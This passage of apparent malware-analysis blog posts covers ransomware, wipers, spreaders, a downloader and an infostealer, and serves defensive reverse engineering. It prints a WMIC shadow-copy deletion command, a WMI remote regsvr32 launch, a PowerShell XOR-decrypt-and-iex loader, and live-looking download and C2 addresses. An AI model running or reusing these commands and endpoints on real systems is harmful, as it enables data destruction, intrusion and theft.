140697838577926, &#39;rcx&#39;, 140697838577946, 140697838577648), (140697838578096, 140697838578122, 18446744072975528772, &#39;cmovl&#39;, 140697838578111, &#39;rdx&#39;, 140697838578124, 140697838578531), (140697838578124, 140697838578150, 18446744072886880558, &#39;cmovl&#39;, 140697838578139, &#39;rdx&#39;, 140697838578152, 140697838579331), (140697838578152, 140697838578178, 18446744072686906926, &#39;cmovz&#39;, 140697838578167, &#39;rcx&#39;, 140697838578180, 140697838577648), (140697838578224, 140697838578250, 2104599011, &#39;cmovl&#39;, 140697838578239, &#39;rdx&#39;, 140697838578252, 140697838578619), (140697838578252, 140697838578278, 2056782390, &#39;cmovl&#39;, 140697838578267, &#39;rdx&#39;, 140697838578280, 140697838579420), (140697838578280, 140697838578306, 1814337361, &#39;cmovz&#39;, 140697838578295, &#39;rcx&#39;, 140697838578308, 140697838577648), (140697838578329, 140697838578355, 18446744072645564105, &#39;cmovl&#39;, 140697838578344, &#39;rdx&#39;, 140697838578357, 140697838579517), (140697838578357, 140697838578383, 18446744072142530087, &#39;cmovz&#39;, 140697838578372, &#39;rcx&#39;, 140697838578385, 140697838577648), (140697838578441, 140697838578462, 1020697904, &#39;setl&#39;, 140697838578448, &#39;rdx&#39;, 140697838578464, 140697838579720), (140697838578464, 140697838578489, 992709150, &#39;setnz&#39;, 140697838578471, &#39;rcx&#39;, 140697838577648, 140697838578491), (140697838578531, 140697838578557, 18446744073387544561, &#39;cmovl&#39;, 140697838578546, &#39;rdx&#39;, 140697838578559, 140697838579794), (140697838578559, 140697838578585, 18446744072975528772, &#39;cmovz&#39;, 140697838578574, &#39;rcx&#39;, 140697838578587, 140697838577648), (140697838578619, 140697838578645, 2107475699, &#39;cmovl&#39;, 140697838578634, &#39;rdx&#39;, 140697838578647, 140697838577608), (140697838578647, 140697838578673, 2104599011, &#39;cmovz&#39;, 140697838578662, &#39;rcx&#39;, 140697838578675, 140697838577648), (140697838578757, 140697838578783, 18446744072135251631, &#39;cmovz&#39;, 140697838578772, &#39;rcx&#39;, 140697838578785, 140697838577648), (140697838578913, 140697838578939, 389785057, &#39;cmovz&#39;, 140697838578928, &#39;rcx&#39;, 140697838578941, 140697838577648), (140697838579331, 140697838579357, 18446744072886880558, &#39;cmovz&#39;, 140697838579346, &#39;rcx&#39;, 140697838579359, 140697838577648), (140697838579420, 140697838579446, 2056782390, &#39;cmovz&#39;, 140697838579435, &#39;rcx&#39;, 140697838579448, 140697838577648), (140697838579517, 140697838579542, 18446744072645564105, &#39;setz&#39;, 140697838579524, &#39;rcx&#39;, 140697838579544, 140697838577648), (140697838579720, 140697838579746, 1020697904, &#39;cmovz&#39;, 140697838579735, &#39;rcx&#39;, 140697838579748, 140697838577648), (140697838579794, 140697838579820, 18446744073387544561, &#39;cmovz&#39;, 140697838579809, &#39;rcx&#39;, 140697838579822, 140697838577648)] for bb in bb_jmp_table: bb_start = bb[0] bb_end = bb[1] eax_value = bb[2] jmp_condition = bb[3] jmp_condition_address = bb[4] jmp_register = bb[5] jmp_addr_satisfied = bb[6] jmp_addr_unsatisfied = bb[7] patch_jmp_cond_start = jmp_condition_address jmp_rel_statisfied = jmp_addr_satisfied - (patch_jmp_cond_start + 6) patch_jmp_start = patch_jmp_cond_start + 6 jmp_rel = jmp_addr_unsatisfied - (patch_jmp_start + 5) if jmp_condition == &#39;cmovl&#39; or jmp_condition == &#39;setl&#39;: # jl patch_jmp_condition = b&#39; x0f x8c&#39; + struct.pack(&#39;&lt;i&#39;,jmp_rel_statisfied) patch_jmp = b&#39; xe9&#39; + struct.pack(&#39;&lt;i&#39;,jmp_rel) elif jmp_condition == &#39;cmovz&#39; or jmp_condition == &#39;setz&#39;: # jz patch_jmp_condition = b&#39; x0f x84&#39; + struct.pack(&#39;&lt;i&#39;,jmp_rel_statisfied) patch_jmp = b&#39; xe9&#39; + struct.pack(&#39;&lt;i&#39;,jmp_rel) elif jmp_condition == &#39;setnz&#39;: # jnz patch_jmp_condition = b&#39; x0f x85&#39; + struct.pack(&#39;&lt;i&#39;,jmp_rel_statisfied) patch_jmp = b&#39; xe9&#39; + struct.pack(&#39;&lt;i&#39;,jmp_rel) # calculat nops for end of patch total_bytes = bb_end - jmp_condition_address + 2 nop_count = total_bytes - 11 # 11 bytes for the patch + nops to fill space patch_bytes = patch_jmp_condition + patch_jmp + b&#39; x90&#39;* nop_count # patch the bytes patch_ptr = jmp_condition_address for c in patch_bytes: patch_byte(patch_ptr, c) patch_ptr += 1 .",
            "url": "https://research.openanalysis.net/pandora/ransomware/malware/unpacking/dumpulator/emulation/2022/03/19/pandora_ransomware.html",
            "relUrl": "/pandora/ransomware/malware/unpacking/dumpulator/emulation/2022/03/19/pandora_ransomware.html",
            "date": " • Mar 19, 2022"
        }
        
    
  
    
        ,"post17": {
            "title": "BlackCat Ransomware",
            "content": "BlackCat/ALPHV crew made some adjustments to their ransomware. Previous methods for extracting the config aren’t working anymore. Introducing BlackCat/ALPHV 2.0??SHA1: 8c70191b12f14eed594388c8fbe05efe6ebaa564Cc @vxunderground @f0wlsec https://t.co/0Mz0cRMnTi . &mdash; pancak3 (@pancak3stack) March 16, 2022 . Overview . Sample 6dd995d896a9a593b2c48d09da60bd83866d8577273f36d38788d83ad8173e68 . References . Sample is on MalwareBazaar | Old config extracto from f0wl on blackCatConf | Paloalto Threat Assessment: BlackCat Ransomware | Talos From BlackMatter to BlackCat: Analyzing two attacks from one affiliate | . Rust Reverse Engineering . BlackCat is written in Rust and is very time consuming to reverse engineer. To speed up the process we used a combination of debugging and some python scripts courtesy of @fwosar. . The Config . There is a new BlackCat ransomware sample out and it the config is now protected using a command line supplied ACCCESS_TOKEN. The token is used to generate an AES key which is then used to decrypt the encrypted config. . Notes . Ransomware options . USAGE: [OPTIONS] [SUBCOMMAND] OPTIONS: --access-token &lt;ACCESS_TOKEN&gt; Access Token --bypass &lt;BYPASS&gt;... --child Run as child process --drag-and-drop Invoked with drag and drop --drop-drag-and-drop-target Drop drag and drop target batch file --extra-verbose Log more to console -h, --help Print help information --log-file &lt;LOG_FILE&gt; Enable logging to specified file --no-net Do not discover network shares on Windows --no-prop Do not self propagate(worm) on Windows --no-prop-servers &lt;NO_PROP_SERVERS&gt;... Do not propagate to defined servers --no-vm-kill Do not stop VMs on ESXi --no-vm-kill-names &lt;NO_VM_KILL_NAMES&gt;... Do not stop defined VMs on ESXi --no-vm-snapshot-kill Do not wipe VMs snapshots on ESXi --no-wall Do not update desktop wallpaper on Windows -p, --paths &lt;PATHS&gt;... Only process files inside defined paths --propagated Run as propagated process --ui Show user interface -v, --verbose Log to console . Set desktop ransom note All Usersdeploy_note_and_image_for_all_users= . Mutex Local RustBacktraceMutex . Batch file name drag-and-drop-target.bat . Batch file contents (encrypted) . @ECHO OFF SETLOCAL SET allargs=%* &quot;${EXECUTABLE}&quot; --access-token ${ACCESS_TOKEN} --drag-and-drop -p %allargs% . Propogation . The ransomware contains an embedded encrypted copy of psExec. This is likely used as part of their propagation (worm). The ransomware can be executed via the drag-and-drop-target.bat batch files. These are a useful artifact to recover during IR as they will contain the ACCESS_TOKEN which can be used to decrypt the config. . Entropy Fider . To help identify high entropy sections of the binary (encrypted data) we used this nice script from @fwosar . def report_entropies(file_path): import rolling from pathlib import Path data = Path(file_path).read_bytes() entropies = rolling.Entropy(data, 512) high_entropy_start = None for i, entropy in enumerate(entropies): if entropy &gt; 7 and not high_entropy_start: high_entropy_start = i + 512 if entropy &lt; 7 and high_entropy_start: print(f&quot;Found high entropy section starting at {hex(high_entropy_start)} up to {hex(i + 512)}. Totalling {(i + 512) - high_entropy_start} bytes.&quot;) high_entropy_start = None if high_entropy_start: print(f&quot;Found high entropy section starting at {hex(high_entropy_start)} up to {hex(len(data))}. Totalling {len(data) - high_entropy_start} bytes.&quot;) .",
            "url": "https://research.openanalysis.net/blackcat/ransomware/malware/python/dumpulator/emulation/2022/03/16/blackcat_ransomware.html",
            "relUrl": "/blackcat/ransomware/malware/python/dumpulator/emulation/2022/03/16/blackcat_ransomware.html",
            "date": " • Mar 16, 2022"
        }
        
    
  
    
        ,"post18": {
            "title": "Hermetic Wizard Malware",
            "content": "Overview . In addition to the Hermetic Wiper malware there were at least three other components used to deploy the wiper bundled into a single binary and referred to as HermeticWizard. . HermeticWizard is started using the command line regsvr32.exe /s /i &lt;path&gt;. . Samples . HermeticWizard: a259e9b0acf375a8bef8dbc27a8a1996ee02a56889cba07ef58c49185ab033ec MalwareBazaar Sample . In the resources of HermeticWizard are two spreader components, a WMI spreader, and an SMB spreader. . WMI Spreader (exec_x32.dll) . Samples: 2d29f9ca1d9089ba0399661bb34ba2fd8aba117f04678cd71856d5894aa7150b . SMB Spreader (romance.dll) . Sample: 5a300f72e221a228e3a36a043bef878b570529a7abc15559513ea07ae280bb48 . WMI Spreader Analysis . The WMI spreader is a stand-alone untility that is used to copy files to remote shares and execute them. The spreader is excuted via HermeticWizard using the following example command line. . rundll32 &lt;spreader path&gt; #1 -s &lt;path to HermeticWizard&gt; – i &lt;target IP&gt; . The spreader accepts the following command line arguments:-i,-h,-s,-a,-c . s path to the file to copy | i remote host IP | h optional remote share path (*not confirmed) | a optional brute force share password (*not confirmed) | c optional brute force share domain username password list (*not confirmed) | . Network Service Account . The spreader checks to see if it has local admin priviledges. If it has local admin it attempts to impersonate the Network Service service account. . Stack Overflow reference . NetworkService account . Limited service account that is meant to run standard privileged services. This account is &gt; far more limited than Local System (or even Administrator) but still has the right to access the network as the machine (see caveat above). . NT AUTHORITY NetworkService | the account has no password (any password information you provide is ignored) | HKCU represents the NetworkService user account | has minimal privileges on the local computer | presents the computer&#39;s credentials to remote servers | SID:S-1-5-20&gt; - has its own profile under the HKEY_USERS registry key (HKEY_USERSS-1-5-20) | If trying to schedule a task using it, enter NETWORK SERVICE into the Select User or Group &gt; dialog | . Share file copy . The spreader attempts to authenticate to the ADMIN&#36; remote share. If a password list is supplied on the command line the share authentication is brute forced. Once authenticated the files are copied to the share. . WMI COM Interface . For programatic access to WMI the wiper uses COM. . CLSID_WbemLocator {4590f811-1d3a-11d0-891f-00aa004b2e24} . IID_IWbemLocator {dc12a687-737f-11cf-884d-00aa004b2e24} . Big thanks to Mike Bailey for his COM Presentation. He also has a nice (free) video on Pluralsight. IDA has the vtable for IWbemLocator as a struct so we can just directly apply it. . Creating Processes Remotely using WMI . MSDN Reference . Similar example code from GitHub . Connection to remote host via WMI using &lt;target_ip&gt; root cimv2 . impersonate another user in CoCreateInstanceEx using COAUTHIDENTITY with COAUTHIDENTITY . Use WMI to access remote hosts . Method Win32_Process Create CommandLine | Command executed via WMI: | . C: Windows system32 cmd.exe /c start C: Windows system32 regsvr32.exe /s /i C: Windows %s.dll . This is used to launch the HermeticWizard binary that has been copied to the remote host. .",
            "url": "https://research.openanalysis.net/hermetic/hermetic%20wizard/spreader/malware/apt/2022/03/10/hermetic_wizard.html",
            "relUrl": "/hermetic/hermetic%20wizard/spreader/malware/apt/2022/03/10/hermetic_wizard.html",
            "date": " • Mar 10, 2022"
        }
        
    
  
    
        ,"post19": {
            "title": "Conti Ransomware V2 Source Code Leak",
            "content": "Overview . Some backstory here, a twitter account @contileaks began posting leaked chat logs and source code from the Conti ransomware group. Initially they posted a password protected archive of the Conti v2 source code. Later posted an archive of the source code with the locker cpp files removed and no password. This was apparently an attempt to prevent others from compiling the source code and using it. The release of the second archive allowed a cryptographic attack on the password protected archive and the release of the full source code. . Builder . The ransomware project comes with a builder that can be used to customize the compiled ransowmare binary (and decryptor). It basically runs a string replace on the binary to insert custom data like the RSA key and the decryption note. Some examples of the replaced strings are below. . __publickey__ __privatekey__ __DECRYPT_NOTE__ . Obfuscation . They are using a macro based on ADVObfuscator to obfuscate strings inline in the code. . #define OBFW(str)((const wchar_t*)MetaBuffer&lt;std::get&lt;MetaRandom2&lt;__COUNTER__, 30&gt;::value&gt;(PrimeNumbers), MetaRandom2&lt;__COUNTER__, 126&gt;::value, std::make_index_sequence&lt;sizeof(str)&gt;&gt;((const unsigned char*)str).decrypt()) . API Hashing . Hashing: MurmurHash2A contant=0x5bd1e995 . They pre-calculate the API hashes and define each API wrapper in api.cpp then call the API definitions in the code. This doesn&#39;t seem like the most efficient way to do API hashing. . Example. . inline DWORD WINAPI pGetProcessId( HANDLE Process ) { DWORD(WINAPI * pFunction)(HANDLE); pFunction = (DWORD(WINAPI*)(HANDLE))api::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x31d910df, 9);//GetProcAddress(hKernel32, OBFA(&quot;GetProcessId&quot;)); return pFunction(Process); } . Command Args . LPWSTR HostsPath = GetCommandLineArg(Argv, Argc, OBFW(L&quot;-h&quot;)); LPWSTR PathList = GetCommandLineArg(Argv, Argc, OBFW(L&quot;-p&quot;)); LPWSTR EncryptMode = GetCommandLineArg(Argv, Argc, OBFW(L&quot;-m&quot;)); LPWSTR LogsEnabled = GetCommandLineArg(Argv, Argc, OBFW(L&quot;-log&quot;)); . Encryption . Encryption Modes (File To Encrypt) . enum EncryptModes { ALL_ENCRYPT = 10, LOCAL_ENCRYPT = 11, NETWORK_ENCRYPT = 12, BACKUPS_ENCRYPT = 13 }; . Encrypt Modes (File Encryption) . Three modes of encryption based on file type and size. . enum ENCRYPT_MODES { FULL_ENCRYPT = 0x24, PARTLY_ENCRYPT = 0x25, HEADER_ENCRYPT = 0x26 }; . DB files get full encrypt | VM files get partial encrypt | Under 1M is full encrypt | Between 1M - 5M gets header encrypt | Over 5M is partial encrypt | . Partial Encrypt Mode . The partial encrypt mode can encrypt a file by percent, either 20% or 50%. This translates into a &quot;step&quot; size of data blocks that are encrypted in the file. . Delete Shadow Copies . Gain access to WMI via COM. . // Step 1: -- // Initialize COM. // Step 2: -- // Set general COM security levels -- // Step 3: // Obtain the initial locator to WMI - // Step 4: -- // Connect to WMI through the IWbemLocator::ConnectServer method // Connect to the root cimv2 namespace with // the current user and obtain pointer pSvc // to make IWbemServices calls. // Step 5: -- // Set security levels on the proxy - // Step 6: -- // Use the IWbemServices pointer to make requests of WMI - // For example, get the name of the operating system // Step 7: - // Get the data from the query in step 6 - // Get the value of the Name property // Cleanup // ======== . Copy-paste from MSDN WMI . Then use WMI to delete shadows . &quot;cmd.exe /c C: Windows System32 wbem WMIC.exe shadowcopy where &quot;ID=&#39;%s&#39; &quot; delete . KIll File Owner To Free File For Encryption . They use the RestartManager to enumerate processes with a handle to the file they are trying to encrypt. Then they can kill the process. . Crypto . Using the Windows crypto APIs to generate a chacha key CryptGenRandom then they use statically linked chcha algorithm to encrypt files then RSA encrypt the generated key. . The chacha library is a copy-paste from this chacha-merged.c . Also ref wiki article on chacha. . /* chacha-merged.c version 20080118 D. J. Bernstein Public domain. */ . Encrypted File Structure . The file is encrypted based on the encryption mode. The RSA encrypted chacha key is then appended to the encrypted file. Then a buffer containing the encryption mode constant and the data percent value is written to the file. This forms a footer that can be used by the decryptor to decrypt the file. . - encrypted data - RSA encrypted chacha key - byte encryption mode - byte percent value . File Share Scanning . Scan local subnets for hosts, then scan hosts for shares. . Directory Blacklist . OBFW(L&quot;tmp&quot;), OBFW(L&quot;winnt&quot;), OBFW(L&quot;temp&quot;), OBFW(L&quot;thumb&quot;), OBFW(L&quot;$Recycle.Bin&quot;), OBFW(L&quot;$RECYCLE.BIN&quot;), OBFW(L&quot;System Volume Information&quot;), OBFW(L&quot;Boot&quot;), OBFW(L&quot;Windows&quot;), OBFW(L&quot;Trend Micro&quot;) . File Extension Blacklist . OBFW(L&quot;.exe&quot;), OBFW(L&quot;.dll&quot;), OBFW(L&quot;.lnk&quot;), OBFW(L&quot;.sys&quot;), OBFW(L&quot;.msi&quot;), OBFW(L&quot;R3ADM3.txt&quot;), OBFW(L&quot;CONTI_LOG.txt&quot;) . Readme File . The file name is hardcoded in the binary R3ADM3.txt. . Log File . Logging is an option specified as a command parameter. The log file path is hard coded as C: CONTI_LOG.txt. .",
            "url": "https://research.openanalysis.net/conti/ransomware/malware/source/2022/03/03/conti_ransomware_source.html",
            "relUrl": "/conti/ransomware/malware/source/2022/03/03/conti_ransomware_source.html",
            "date": " • Mar 3, 2022"
        }
        
    
  
    
        ,"post20": {
            "title": "Hermetic Wiper Malware",
            "content": "Overview . Sample: 1bc44eef75779e3ca1eefb8ff5a64807dbc942b1e4a2672d77b9f6928d292591 . Sample 2: 0385eeab00e946a302b24a91dea4187c1210597b8e17cd9e2230450f5ece21da . References . Sample on Malshare | J. A. Guerrero-Saade Twitter Thread | ESET Twitter Thread | CrowdStrike Blog | SentinalOne Blog | . Backstory . Wiper binary is signed using a code signing certificate issued to Wiper binary is signed using a code signing certificate issued to Hermetica Digital Ltd | Wiper abuses legitimate drivers from the EaseUS Partition Master | Modifying CrashControl regkey, CrashDumpEnabled key to 0 | Enumerating PhysicalDrives up to 100 - can you even have 100 drives?? | . Abused Legit Drivers . The following legit drivers are stored in the resources section of the PE. They are compressed. . RCDATA_DRV_X64 (mscompress) e5f3ef69a534260e899a36cec459440dc572388defd8f1d98760d31c700f42d5 | RCDATA_DRV_X86 (mscompress) b01e0c6ac0b8bcde145ab7b68cf246deea9402fa7ea3aede7105f7051fe240c1 | RCDATA_DRV_XP_X64 (mscompress) b6f2e008967c5527337448d768f2332d14b92de22a1279fd4d91000bb3d4a0fd | RCDATA_DRV_XP_X86 (mscompress) fd7eacc2f87aceac865b0aa97a50503d44b799f27737e009f91f3c281233c17d | . Reversing Notes . Arg1 is a sleep before reboot (in minutes) Arg2 is sleep before ??? (minutes minus the arg1 sleep) . Grants itself SeBackupPrivilege, and SeShutdownPrivilege. Note, SeBackupPrivilege allows file content retrieval, even if the security descriptor on the file might not grant such access. . If the host is Windows Vista and above they use one set of drivers (64/32bit). For XP they use a different set of drivers (32/64bit). . Dissable crashdump using reg key SYSTEM CurrentControlSet Control CrashControl CrashDumpEnabled . Possible driver communication via named pipe . EPMNTDRV 0 . Write the driver from resource to ?? c: Windows system32 Drivers as an mscompress file. Then copy and decompress it to another file with the same name and a .sys file extension. Then grant SeLoadDriverPrivilege priviledges to self and load driver. . for i in range(0,41,4): print(f&quot;DWORD d{i};&quot;) . DWORD d0; DWORD d4; DWORD d8; DWORD d12; DWORD d16; DWORD d20; DWORD d24; DWORD d28; DWORD d32; DWORD d36; DWORD d40; .",
            "url": "https://research.openanalysis.net/hermetic/hermetic%20wiper/wiper/malware/apt/2022/02/27/hermetic_wiper.html",
            "relUrl": "/hermetic/hermetic%20wiper/wiper/malware/apt/2022/02/27/hermetic_wiper.html",
            "date": " • Feb 27, 2022"
        }
        
    
  
    
        ,"post21": {
            "title": "Reversing Unknown Polyglot JPG Downloader",
            "content": "Overview . The sample originated as a message through wechat. The mawlare is currently unknown. Submissions to VirusTotal indicate that the original file name was 申博公司服务器采购表.exe which roughly translates to Shenbo company server purchase form.exe . Sample: 104bd2d33c119d007df2adbc571a3e8cfac722cf1f0b6156ba211f413905e9f4 . When executed the sample downloads a polyglot jpg as a second stage from http://43.129.168.248/xlb.jpg . Second Stage: xlb.jpg - 32fb33a87f5123e919eb416b2c95a98b2f4b367812a51758bb1daeaf114b6b50 . Related samples on VirusTotal that download the same second stage. . 天博独立站.bat translating to Tianbo Independent Station | 服务器预付表1docx.bat translating to Server Prepaid Form | . References: . Malshare Sample - Stage 1 | Malshare Sample - Stage 2 (jpg) | Malshare Sample - Stage 3 (not confirmed!) | . Stage 1 . Download http://43.129.168.248/xlb.jpg -&gt; C: ProgramData xlb.jpg . Decrypt jpg starting at offset 83877 using -6 ^ 0x78 for range 7176 then directly execute! . import sys import os JPG_FILEPATH = r&#39;/tmp/work/xlb.jpg&#39; OUT_SHELLCODE_FILEPATH = r&#39;/tmp/work/shellcode.bin&#39; jpg_data = open(JPG_FILEPATH, &#39;rb&#39;).read() jpg_offset = 83877 out = [] for i in range(0,7176): out.append(((jpg_data[jpg_offset+i] - 6) &amp; 0xff) ^ 0x78) open(OUT_SHELLCODE_FILEPATH, &#39;wb&#39;).write(bytes(out)) . 7176 . Stage 2 . Check mutex ozhpanvityfxknsr to ensure we are only running once. . Check for a list of process names. . proc_names = [&#39;rr&#39;,&#39;471&#39;,&#39;tphpv&#39;,&#39;rjejbo&#39;,&#39;ufmfhsbn&#39;,&#39;hpphmf&#39;,&#39;xfdibu&#39;,&#39;gmzwqo&#39;,&#39;fu/fyf&#39;,&#39;xqt&#39;,&#39;ntfehf&#39;,&#39;fydfm&#39;,&#39;xpse&#39;,&#39;qpjou&#39;,&#39;usbz&#39;,&#39;gjsfgpy&#39;,&#39;thuppm&#39;,&#39;dmpve&#39;,&#39;opufqbe&#39;,&#39;dbmd&#39;,&#39;{ivepohgbohzv&#39;,&#39;mjof&#39;,&#39;rvjdlr&#39;] . for n in proc_names: out = &#39;&#39; for i in n: out += chr((ord(i) -1)&amp;0xff) print(out) . C2 Comms . The malware connect to the C2 via a TCP socket using a hardcoded IP and port 43.129.168.248:16166 . The malware sendd the C2 the it&#39;s current module name and waits to receive data. . The c2 return data is composed of a structure including a flag, length, xor key, data. . // DWORD flag // DWORD length // BYTE xor_key[32] // Data ... . The C2 data contains a stage3 PE file that is reflectivly loaded into memory by the malware and executed via the export PluginMe . Stage 3 . Stage3 was not directly recovered from the download chain but was recovered as an artifact from the infected host. An assumption was made that this was stage3 based on the unique export PluginMe. . Sample: 7d47e5871efc4c079531513f29926d394922d7954701f34dc6244ea311d20969 . Reversing Tips . The binary is witten in C++ with STL using MSVC 6.0 (very old). The STL types cause all kinds of pain but we can using Lumina and FLIRT to identify most of the functions. Rolf has a nice IDA script that will add some STL structs to IDA for us. . One STL type the pops up is the List. To use the script to add this struct simply run it in IDA then use MakeListTypes(DWORD) in the Python CLI to define the structs. . We also had trouble with the string object. This was resolved on stream. . General . Mutex name: db38wzikd . Store data in registry under key HKEY_CURRENT_USER Software 2345.com Mini . logname | . The logname is composed of the hostname username and timestamp likes so hostname-username-timestamp . &quot;%d%02d%02d%02d%02d%02d&quot;, SystemTime.wYear, SystemTime.wMonth, SystemTime.wDay, SystemTime.wHour, SystemTime.wMinute, SystemTime.wSecond . group | host | install | . C2 Comms . C2 host: tesla.tomcat.buzz port 16333 -&gt; used to resolve to 43.129.168.248 (same as stage 1,2 C2) . The sample connects to the C2 and immediatly expects to recieve commands, no data is sent initially. . The C2 recv data is encrypted with ^ 0x33 - 103 . C2 command xlbfdc might cause the RAT to upload its accumulated data. .",
            "url": "https://research.openanalysis.net/polyglot/downloader/malware/ghost%20rat/gh0st/2022/02/20/polyglot_dropper_ghost.html",
            "relUrl": "/polyglot/downloader/malware/ghost%20rat/gh0st/2022/02/20/polyglot_dropper_ghost.html",
            "date": " • Feb 20, 2022"
        }
        
    
  
    
        ,"post22": {
            "title": "Jupyter Infostealer",
            "content": "Overview . Packed sample: ee904ce81c66b774897f93b0301e297a9137295516d57ba1c4e078a383cbce39 . The sample is too big for Malshare raw but we zipped it and uploaded it, the password is infected Malshare Zip Sample. . This is also known by some other names: Jupyter, Polazert, solarmarker, YellowCockatoo . References: . Morphisec Blog: Jupyter Infostealer | CrowdStrike: Blocking SolarMarker Backdoor | Talos: Solarmarker | . Unpacking Inno - Stage 1 . Tools . Inno Extractor (950208c1b7d4d901ca7b942f98214098dc91480cc70af1af12b2291544eb761f) | Inno Setup Decompiler (Pascal Decompiler) (602e0a4e1efaff739ee308da7fd4c4b5ca3aa6d0640f47ef74b0d445f968301b) | DirWatch (031e8f61f1501a76015d3add269663172abc648973032dcff4e758effa66b235) | . Behaviour . Inno installer drops and executes a benign file to attempt to look legitimate Docx2Rtf.exe (caf8e546f8c6ce56009d28b96c4c8229561d10a6dd89d12be30fa9021b1ce2f4) | The Inno compile Pascal script is used for the malicious install | The script drop two .txt files in %TEMP% with random names | One file is executed 9 times with PowerShell and is used to decrypt and launch the second file, which is also PowerShell | . Manual Extraction . Use Inno Extractor to extract all files from the Inno installer | Use Inno Setup Decompiler to decompile the extracted CompiledCode.bin file | Use DirWatch to monitor %temp% directory with &quot;auto save&quot; option eabled | Grab the two .txt PowerShell files that were dropped in %temp% - These are Stage 2 | . The PowerShell code below is used to decrypt the 2nd .txt PowerShell file . ; $xk=&#39;&#39;szikwYdJyBvQLWRAeNXPGaxEObVolScHnrKtqhMpfDjTIUgFuCmZ&#39;&#39;; $xb=[System.Convert]::FromBase64String([System.IO.File]::ReadAllText($p)); remove-item $p; for($i=0;$i -lt $xb.count;){ for($j=0;$j -lt $xk.length;$j++){ $xb[$i]=$xb[$i] -bxor $xk[$j]; $i++; if($i -ge $xb.count){$j=$xk.length} } }; $xb=[System.Text.Encoding]::UTF8.GetString($xb); iex $xb; . Stage 2 - PowerShell Deobfuscation . The 2nd stage PowerShell file is Base64 encoded and encrypted with a hard-coded XOR key (found in the first PowerShell script). Once decrypted the script is used to decrypt and reflectivly load a .NET assembly into it&#39;s own proccess memory. . Manual Extraction . Instead of attempting to maually decode the PowerShell we can take advantage of the fact that it relfectivly loads a .NET assembly to simply dump the assembly out of the process. . Run the malware and watch the process tree with ProcessHacker | When the PowerShell process executes suspend it (there are 9, just grab the one that stays running) | Use ExtreamDumper to dump the .NET assembly out of the PowerShell process | . Stage 3 - .NET Assembly . Config . ver = &quot;DR/1.1&quot;; xorkey = &quot;FVdXLbjs0Rwxsz9CrFh0pSot6Gijigf8t56R&quot;; addr = &quot;http://91.241.19.21&quot; . Hardware ID . The hardware ID is stored in %userprofile% AppData Roaming solarmarker.dat and is just a random string. . C2 Traffic . C2 traffic is encrypted using the xorkey from the hard coded config, then base64 encoded. . Command: ping . { &quot;action&quot;:&quot;ping&quot;, &quot;hwid&quot;:hwid, &quot;pc_name&quot;:M.GetComputerName(), &quot;os_name&quot;:M.GetWinVersion(), &quot;arch&quot;:M.Is64x()?&quot;x64&quot;:&quot;x86&quot;, &quot;rights&quot;:M.IsAdmin()?&quot;Admin&quot;:&quot;User&quot;, &quot;version&quot;:ldrConfig.ver, &quot;workgroup&quot;:M.GetWorkGroup()|M.WMI(&quot;win32_computersystem&quot;,&quot;domain&quot;), &quot;dns&quot;:(M.WMI(&quot;win32_computersystem&quot;,&quot;partofdomain&quot;).ToLower()==&quot;false&quot;)?&quot;0&quot;:&quot;1&quot;, &quot;protocol_version&quot;:1 } . The C2 can a command via the status var in the response json. The status can be either exe, ps1, or command. . Status: EXE and PS1 . The C2 can send down a stage4 payload that is either a PS1 or an EXE. For PS1 they create a file in %TEMP% and execute it with PowerShell just like the Stage 1 loader. If it&#39;s an EXE they drop it in the %TEMP% and execute it directly. . Status: Command . The C2 can send a PowerShell command that is directly executed. .",
            "url": "https://research.openanalysis.net/jupyter/malware/solarmarker/config/dot%20net/2022/01/30/jupyter_stealer.html",
            "relUrl": "/jupyter/malware/solarmarker/config/dot%20net/2022/01/30/jupyter_stealer.html",
            "date": " • Jan 30, 2022"
        }
        
    
  
    
        ,"post23": {
            "title": "HackingTeam Soldier Implant",
            "content": "Overview . HackingTeam Soldier Implant (packed): 76840fa18df8764afb51f1aa6da10ff65f1bdfe434dc988917380fa31fbe3a73 . All samples on available on Malshare. . References: . Packed Sample on Malshare | Hacking Team Source Code Leak | Noah Labs Blog (360) Hacking Team Solider Implant Analysis | . Unpacking VMP . Run wihtout debugger and pause with ProcessHacker | Attach with x64dbg and search .text for MSVC securty cookie constant | Based on security cookie constant location determine __security_init_cookie function location | Add hardware bp on __security_init_cookie function and relaunch process with debugger | Use call stack to determine what called __security_init_cookie function this is OEP | Remove hardware bp from __security_init_cookie and add hardware bp on OEP | Relaunch program so we break on OEP | Use VMPImportFixer to dump process | Fix OEP statically (PEBear) | . TODO: When we dump with VMPImportFixer there are some imports that are not protected in the binary. These are not captured by VMPImportFixer which means some of our imports are not resolved in the dump! We could maybe fix this by either patching VMPImportFixer to also add unprotected imports ... or we could update VMPFix to add both protected imports and normal imports to the new IAT then dump with Scylla instead of VMPImportFixer. . Config Extraction . The config is AES encrypted with CBC and a null IV | There is a seperate setup function that is used to load the key which is hard coded in the .data section | The config is stored in the .data section and is preceded by a DWORD with the length | . def unhex(hex_string): import binascii if type(hex_string) == str: return binascii.unhexlify(hex_string.encode(&#39;utf-8&#39;)) else: return binascii.unhexlify(hex_string) def tohex(data): import binascii if type(data) == str: return binascii.hexlify(data.encode(&#39;utf-8&#39;)) else: return binascii.hexlify(data) . data_len = 0x240 data = unhex(&#39;238ba1f22cb105cdae82eb2dde4e2783c80370198e1bb02c231825e7b2d8c164109e5a4e09c63a36df5ed3c5ce49b825968d386eb9008ed2b6cae3b75cd8ba76d49ab1acf69d46a747934187883b2eb27aaab99dae892693dc714433ec2de2d238a036f5ff492414a6a4928f4bd907342e7fff0dd6e61f2a7675b351842a27bc1ba7d5ad7ebc44a11cfafd136f42644db89db7189c4d152a06b10f0c0a4b40c021d7192a04cd383b17434048768076c7d7eb073ef340c696aa35946aacbe99821352487082660334de43ca4e5e142d78f70dc7cb5b571463c3c3c7caf461eac5411136142b0051914f74859c44610f8e4fdcf4f6c269b03809e3aa67ebc3474ece444fe2f5078d36857c17147d834c6cb6ccd9effefca8b24ee01c0868fc1383ef26519c4f573f94b5bbb7b149dcc190f0a08fdc31965d69d97bbcf565e829182b8aa421f46a7e0100180d7ed9d31083b4b68431e0b888bbacb00864f140716359290eb37927ec0ea537b620e1108265f412a28c28c2df0cf1d713880cd874f79872dde1060d29cc7536684d49b504dcfc61c80a1210a5e69533bba05aad0a6dc7239ea90e29e822e0424f06524330a98f40e56c1149bad0350b6c79b1c03963e0cf43dce2f6f6e6412dee43ef937bff51bf345e57bc60c7df2ec4294cc2789547896a53dc43ab5fc15c6a377d0dbab97ff5e091f90fc28ad7acda94543b52bccea2c8f360e03a5fc01cab6d358804037ab20e17facc31293b437b7a22d8c32